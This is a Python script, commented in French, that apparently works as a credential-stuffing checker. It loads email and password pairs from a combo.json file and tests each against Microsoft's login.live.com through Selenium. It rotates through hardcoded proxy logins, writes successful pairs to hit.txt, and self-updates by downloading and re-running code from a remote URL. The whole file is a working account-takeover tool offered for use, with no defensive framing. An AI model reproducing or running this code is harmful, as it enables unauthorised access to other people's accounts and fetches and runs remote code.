# -*- coding: utf-8 -*-  # Indiquer l'encodage UTF-8
import os
import json
import time
import tkinter as tk
from tkinter import filedialog
import requests
import shutil
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore, Style, init
import sys
import subprocess

# Initialisation des couleurs pour la console
init(autoreset=True)

CURRENT_VERSION = "1.0.2"
VERSION_URL = "https://raw.githubusercontent.com/louisroi/netflixchecker/refs/heads/main/latest_version.txt"
DOWNLOAD_URL = "https://raw.githubusercontent.com/louisroi/netflixchecker/main/netflixchecker.py"

PROXIES = [
    "93291889-zone-custom-region-FR-sessid-DgtOgfNY-sessTime-60:0llEad0L@f.proxys5.net:6200",
    "93291889-zone-custom-region-FR-sessid-PK0y3olo-sessTime-60:0llEad0L@f.proxys5.net:6200",
]

def center(var: str, space: int = None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    return "\n".join((" " * int(space)) + var for var in var.splitlines())

def print_ascii_art():
    art_left = r"""
  ██████  █    ██  ██ ▄█▀ 
▒██    ▒  ██  ▓██▒ ██▄█▒ 
░ ▓██▄   ▓██  ▒██░▓███▄░ 
  ▒   ██▒▓▓█  ░██░▓██ █▄ 
▒██████▒▒▒▒█████▓ ▒██▒ █▄
▒ ▒▓▒ ▒ ░░▒▓▒ ▒ ▒ ▒▒▒ ▓▒
░ ░▒  ░  ░░▒░ ░ ░ ░▒ ▒░
░  ░  ░   ░░░ ░ ░ ░░ ░ 
      ░     ░     ░  ░   
    """

    art_right = r"""
  ██▓▓ █████▄  ▄▄▄     
▒▓██▒▒ ██▀ ██▌▒████▄   
▒▒██▒░ ██   █▌▒██  ▀█▄ 
░░██░░ ▓█▄   ▌░██▄▄▄▄██
░░██░░▒ ████▓ ▒▓█   ▓██
 ░▓   ▒▒ ▓  ▒ ░▒▒   ▓▒█
░ ▒ ░  ░  ▒  ▒ ░ ░   ▒▒ 
░ ▒ ░  ░  ░  ░   ░   ▒  
  ░      ░          ░   
    """

    for left, right in zip(art_left.splitlines(), art_right.splitlines()):
        print(center(Fore.RED + left + Fore.RED + right))
    print(center(f"{Fore.RED}\ngithub.com/sukidadev\n{Fore.RESET}"))

def check_version():
    try:
        response = requests.get(VERSION_URL)
        latest_version = response.text.strip()

        if CURRENT_VERSION != latest_version:
            print(f"{Fore.RED}[ERROR] Vous utilisez la version {CURRENT_VERSION}.")
            print(f"{Fore.RED}[INFO] Une nouvelle version ({latest_version}) est disponible. Téléchargement en cours...{Style.RESET_ALL}")
            download_new_version() 
            relaunch_script() 
    except requests.RequestException as e:
        print(f"{Fore.RED}[ERROR] Impossible de vérifier la version. Détails : {e}")
        exit(1) 

def download_new_version():
    try:
        response = requests.get(DOWNLOAD_URL, headers={'Accept': 'application/vnd.github.v3.raw'})
        if response.status_code == 200:
            script_path = sys.argv[0]
            with open(script_path, 'wb') as f:
                f.write(response.content)
            print(f"{Fore.GREEN}[INFO] Nouvelle version téléchargée avec succès.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[ERROR] Impossible de télécharger la nouvelle version : {response.status_code}.{Style.RESET_ALL}")
            exit(1)
    except requests.RequestException as e:
        print(f"{Fore.RED}[ERROR] Erreur lors du téléchargement de la nouvelle version : {e}{Style.RESET_ALL}")
        exit(1)

def relaunch_script():
    print(f"{Fore.CYAN}[INFO] Relancement du script mis à jour...{Style.RESET_ALL}")
    subprocess.Popen([sys.executable] + sys.argv)
    exit(0)

def check_credentials(email, password, proxy):
    options = Options()
    options.add_argument(f'--proxy-server=http://{proxy}')
    
    driver = webdriver.Firefox(options=options)
    
    try:
        # Naviguer vers la page de connexion
        driver.get("https://login.live.com/")
        
        # Attente explicite pour le champ email
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "loginfmt"))
        )
        username_field.send_keys(email)
        
        # Soumettre le formulaire après avoir rempli l'email
        username_field.send_keys(Keys.RETURN)
        
        # Attente explicite pour le champ mot de passe
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "passwd"))
        )
        password_field.send_keys(password)
        password_field.send_keys(Keys.RETURN)
        
        # Attente pour vérifier si la connexion est réussie ou échouée
        time.sleep(5)  # Attendre un peu plus longtemps pour bien laisser le temps à la page de charger

        # Vérification de l'URL
        current_url = driver.current_url
        if "ppsecure" in current_url:
            print(f"{Fore.RED}[FAIL] Connexion échouée pour {email}. URL: {current_url}{Style.RESET_ALL}")
            login_successful = False
        elif "ar" in current_url:
            print(f"{Fore.GREEN}[SUCCESS] Connexion réussie pour {email}. URL: {current_url}{Style.RESET_ALL}")
            login_successful = True
        else:
            print(f"{Fore.YELLOW}[WARNING] URL inconnue après connexion pour {email}. URL: {current_url}{Style.RESET_ALL}")
            login_successful = False
    
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Erreur lors de la vérification des identifiants : {e}{Style.RESET_ALL}")
        login_successful = False
    
    finally:
        driver.quit()
    
    return login_successful

def run_script(file_path):
    hits = []  # Liste pour stocker les réussites
    
    try:
        if os.path.getsize(file_path) == 0:
            print(f"{Fore.RED}[ERROR] Le fichier combo.json est vide.{Style.RESET_ALL}")
            return

        with open(file_path, 'r') as file:
            combos = json.load(file)
            print(f"{Fore.CYAN}[INFO] Démarrage de la vérification...\n{Style.RESET_ALL}")

            for i, combo in enumerate(combos):
                email = combo["email"]
                password = combo["password"]
                proxy_used = PROXIES[i % len(PROXIES)] 

                result = f"Test de connexion pour {email}:{password} via proxy {proxy_used}..."
                print(result)

                if check_credentials(email, password, proxy_used):
                    print(f"{Fore.GREEN}[SUCCESS] Connexion réussie pour: {email}:{password}\n{Style.RESET_ALL}")
                    hits.append(f"{email}:{password}")  # Ajouter à la liste des réussites
                else:
                    print(f"{Fore.RED}[FAIL] La connexion a échoué pour: {email}:{password}\n{Style.RESET_ALL}")

            print(f"{Fore.CYAN}[INFO] Vérification terminée.\n{Style.RESET_ALL}")
        
        # Enregistrer les réussites dans hit.txt
        if hits:
            with open("hit.txt", "w") as hit_file:
                for hit in hits:
                    hit_file.write(f"{hit}\n")
            print(f"{Fore.GREEN}[INFO] Fichier hit.txt créé avec succès.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[INFO] Aucune réussite, le fichier hit.txt n'a pas été créé.{Style.RESET_ALL}")

    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Le fichier combo.json n'a pas été trouvé.{Style.RESET_ALL}")
    except json.JSONDecodeError:
        print(f"{Fore.RED}[ERROR] Format invalide dans le fichier JSON.{Style.RESET_ALL}")

def open_file_dialog():
    root = tk.Tk()
    root.withdraw()

    file_path = filedialog.askopenfilename(
        title="Sélectionner le fichier combo.json",
        filetypes=[("Fichier JSON", "*.json")]
    )
    
    if file_path:
        print(f"{Fore.CYAN}[INFO] Fichier sélectionné : {file_path}{Style.RESET_ALL}")
        return file_path
    else:
        print(f"{Fore.RED}[ERROR] Aucun fichier sélectionné.{Style.RESET_ALL}")
        return None

def main():
    print_ascii_art()
    check_version() 
    file_path = open_file_dialog()

    if file_path:
        run_script(file_path)
    else:
        print(f"{Fore.RED}[ERROR] Processus annulé.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
